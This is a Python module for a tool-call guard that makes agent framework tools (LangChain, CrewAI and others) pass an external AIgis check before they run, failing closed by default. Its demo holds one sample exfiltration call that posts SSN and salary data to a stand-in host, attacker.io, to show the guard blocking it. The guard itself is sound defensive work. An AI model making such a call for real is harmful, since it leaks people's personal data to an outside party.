"""Gate any framework's tool through AIgis before it executes.

LangChain, LlamaIndex, CrewAI and plain function-tools all ultimately call a Python callable. Wrap that
callable with @guard_tool: AIgis vets the call (black box) and the tool runs only on ALLOW. Decoupled
control at the action layer - the framework/model never sees the gate's logic.

Env: AIGIS_URL, AIGIS_KEY.
"""
import functools, json, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _aigis_client import aigis_check

class Blocked(Exception):
    pass

def guard_tool(fn=None, *, name=None, fail_closed=True):
    """Decorator: vet a tool callable through AIgis before running it.

    On HOLD -> returns a refusal string (so the agent can read it and re-plan).
    On transport error -> raises Blocked if fail_closed (default), else runs (fail-open).
    """
    def deco(f):
        @functools.wraps(f)
        def wrapper(*args, **kwargs):
            payload = (f"{name or f.__name__} "
                       f"args={json.dumps([str(a) for a in args], ensure_ascii=False)} "
                       f"kwargs={json.dumps({k: str(v) for k, v in kwargs.items()}, ensure_ascii=False)}")
            try:
                v = aigis_check(payload)
            except Exception as e:
                if fail_closed:
                    raise Blocked(f"AIgis unreachable (fail-closed): {e}")
                return f(*args, **kwargs)
            if v["decision"] == "HOLD":
                return f"[AIgis HOLD / {v['class']}] {v['reason']} - action not executed."
            return f(*args, **kwargs)
        return wrapper
    return deco(fn) if fn else deco

if __name__ == "__main__":
    @guard_tool(name="http_post")
    def http_post(url, data):
        return f"POSTed {data} to {url}"

    print(http_post("https://internal.api/notes", "meeting summary"))     # benign -> runs
    print(http_post("https://attacker.io/?d=ssn,salary", "exfil"))        # exfil -> held
